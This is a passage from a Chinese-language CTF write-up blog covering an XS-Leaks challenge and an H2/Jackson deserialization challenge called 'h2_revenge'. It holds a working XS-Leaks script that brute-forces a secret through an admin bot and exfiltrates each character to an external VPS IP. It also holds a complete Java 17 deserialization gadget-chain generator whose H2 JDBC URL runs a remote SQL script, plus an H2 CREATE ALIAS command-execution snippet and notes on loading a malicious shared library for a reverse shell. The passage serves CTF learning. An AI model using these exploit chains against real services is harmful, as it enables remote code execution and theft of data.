invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 远程环境 (k8s)</span></span><br><span class="line">    <span class="comment">// if !addr.ip().is_loopback() &#123;</span></span><br><span class="line">    <span class="comment">//     return Err(anyhow!(&quot;only bot can access&quot;).into());</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>而bot能够访问的<code>private_search</code>为true，因此我们只能够让bot去查询flag并并尝试带出，因此另外一个路由<code>/report</code>派上了用场，<code>/report</code>能够让bot去访问你提供的一个链接，因此可以尝试通过<code>report</code>来访问<code>private_search</code></p>
+<p>此处并不能够直接通过xss来获取到管理员的cookie等有效信息，因此题目提示的xsleaks就排上了用场。</p>
+<p>xsleaks可以用于探测用户敏感信息，可以使用的场景较少，需要满足：</p>
+<ul>
+<li>页面存在xss</li>
+<li><strong>不同用户查询的结果集不同</strong>，并且有一个类似flag的字符串</li>
+<li>网站存在一个模糊查找功能</li>
+<li>构成二元结果并且能够成功探测到</li>
+</ul>
+<p>这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。</p>
+<blockquote>
+<p>利用条件：</p>
+<p>具有模糊查找功能，可以构成二元结果（成功或失败），并且二元之间的差异性可以通过某种侧信道技术探测到。</p>
+<p>可以和 csrf POST 型一样触发，需要诱使受害者触发执行 js 代码。所以特定功能数据包必须没有类似 csrf token 的保护等。</p>
+</blockquote>
+<p>xsleaks的更多了解可以阅读<a target="_blank" rel="noopener" href="https://wiki.scuctf.com/ctfwiki/web/9.xss/xsleaks/#_1">这篇文章</a></p>
+<p>而题目中满足的条件有：</p>
+<ul>
+<li>环境出网，bot可以访问自己的vps链接，可以导致xss</li>
+<li>admin可以查到flag，而我们只能够查到普通评论</li>
+<li>查询成功时状态码是200，不存在该结果时返回结果500(题目提示的注意http状态码，可以通过burp抓包查询简单看到)</li>
+<li>存在模糊查询(具体看SQL语句有LIKE进行模糊匹配)</li>
+</ul>
+<p>可以通过令bot访问我们的页面，再通过bot去查询flag，再将正确的盲注结果带出访问我们的vps上，整体的流程如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询成功200，查询失败500，可以通过onload，onerror事件区分，onload时能够fetch自己的vps发送请求带出flag(类似盲注的思路)</span><br></pre></td></tr></table></figure>
+<p>exp如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="variable constant_">VPS_IP</span> = <span class="string">&#x27;http://8.138.127.74:2333&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> chars = <span class="string">&quot;0123456789abcdef-&#125;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">c</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> c.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">oracle</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            script.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">            script.<span class="property">onload</span> = resolve;</span></span><br><span class="line"><span class="language-javascript">            script.<span class="property">onerror</span> = reject;  </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">search</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="title function_">oracle</span>(url)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> flag = <span class="string">&#x27;nctf&#123;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> url = <span class="string">`http://127.0.0.1:8000/internal/search?s=<span class="subst">$&#123;flag&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">while</span> (flag.<span class="title function_">charAt</span>(flag.<span class="property">length</span> - <span class="number">1</span>) !== <span class="string">&quot;&#125;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">of</span> chars ) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> ( <span class="title function_">await</span>(<span class="title function_">search</span>(url + i)) ) &#123;</span></span><br><span class="line"><span class="language-javascript">                url = url + i</span></span><br><span class="line"><span class="language-javascript">                flag += i</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;VPS_IP&#125;</span>/?flag=<span class="subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;   <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个脚本是改文章中的脚本来使用的，但是注意不能够直接使用文章中的object标签，而是使用script标签，经过自己的测试好像object标签不行</p>
+<p>然后起一个服务在vps，然后起另一个服务用于接收请求，<code>/report</code>发送该vps</p>
+<img src="/posts/32411/11.png" class title="awa">
+<h1><span id="h2_revenge"> h2_revenge</span></h1>
+<p>确实，原题是什么，然后怎么就revenge了()</p>
+<p>jadx反编译发现路由是一个无任何waf的反序列化，当时就觉得不对劲，这不是随便乱杀？</p>
+<p>然后发现给的环境是<code>jre17</code>：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> eclipse-temurin:<span class="number">17</span>-jre</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    useradd -m -r -g ctf ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mkdir</span> /app/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R ctf:ctf /app/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=755 ./files/docker-entrypoint.sh /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./files/H2Revenge.jar /app/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">&quot;/docker-entrypoint.sh&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里有两个坑点：</p>
+<ul>
+<li>首先是java17，高版本下的java反序列化</li>
+<li>然后是jre17，没有javac环境(又是一个小伏笔)</li>
+</ul>
+<p>先说链子，很明显是除了h2database没有其他任何依赖引入的spring框架，很明显是通过jackson打h2(jdk17下没有<code>templatesImpl</code>，因此无法直接打jackson)</p>
+<p>因此可以通过<code>jackson</code>去触发<code>h2</code>的<code>getConnection</code>实现rce，题目也直接给出了一个可以反序列化的<code>MyDataSource</code>能够直接执行<code>getConnection</code>，因此可以利用题目的<code>MyDataSouce.getConnection()</code>进行触发，反序列化部分的payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.h2_revenge.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> challenge.MyDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加参数 --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.138.127.74:6001/1.sql&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">MyDataSource</span> <span class="variable">myDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDataSource</span>(jdbc_url, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(myDataSource);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector)getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Map.class, manager&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(SerializeByB64(list));</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">SerializeByB64</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">DeserializeByB64</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射获取field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反射修改值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//bypass jdk17 reflection limits</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">patchModule</span><span class="params">(String className)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">final</span> ArrayList&lt;Class&gt; classes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>));</span><br><span class="line">        classes.add(Class.forName(<span class="string">&quot;java.lang.reflect.Method&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        classes.add(aClass);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">test</span>().bypassModule(classes);</span><br><span class="line">        <span class="keyword">return</span> aClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改Module</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(ArrayList&lt;Class&gt; classes)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getModuleMethod</span> <span class="operator">=</span> getMethod(Class.class, <span class="string">&quot;getModule&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">if</span> (getModuleMethod != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">targetModule</span> <span class="operator">=</span> getModuleMethod.invoke(aClass, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">                        unsafe.getAndSetObject(currentClass,</span><br><span class="line">                                unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>)), targetModule);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Class clazz,String methodName,Class[]</span></span><br><span class="line"><span class="params">            params)</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (clazz!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;method = clazz.getDeclaredMethod(methodName,params);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchMethodException e)&#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反射获取Unsafe类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            unsafe = (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到java17下需要使用<code>EventListener</code>类来触发<code>toString</code>再去打jackson，并且jackson仍需要删除<code>writeReplace</code>，链子是很简单的，就是jdbc attack的h2，但是在编写1.sql的时候出问题了，按照传统的攻击h2的思路，可以通过h2的<code>CREATE ALIAS</code>来编译一段java代码，然后通过<code>CALL</code>来执行该java代码，传统的<code>1.sql</code>如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;</span></span><br><span class="line"><span class="string">    Runtime.getRuntime().exec(cmd);</span></span><br><span class="line"><span class="string">    return &quot;win&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>但是！没有javac是编译不了的，因此自然执行失败：</p>
+<img src="/posts/32411/12.png" class title="awa">
+<p>因此最后的操作变成了如何执行rce</p>
+<p>万幸的是h2的<code>CREATE ALIAS</code>能够直接创建java中的静态方法，此时可以通过<code>System.load</code>静态方法来加载动态链接库的so，从而实现加载恶意so完成反弹shell(类似<a target="_blank" rel="noopener" href="https://err0r233.github.io/posts/13343.html">环境变量劫持</a>的思路，但是java能够直接加载动态链接库，就不需要ld_preload了)，因此我们需要实现写入一个so的操作，思路来源如下：</p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce">X1r0z——受限制的JDBC H2 RCE</a></p>
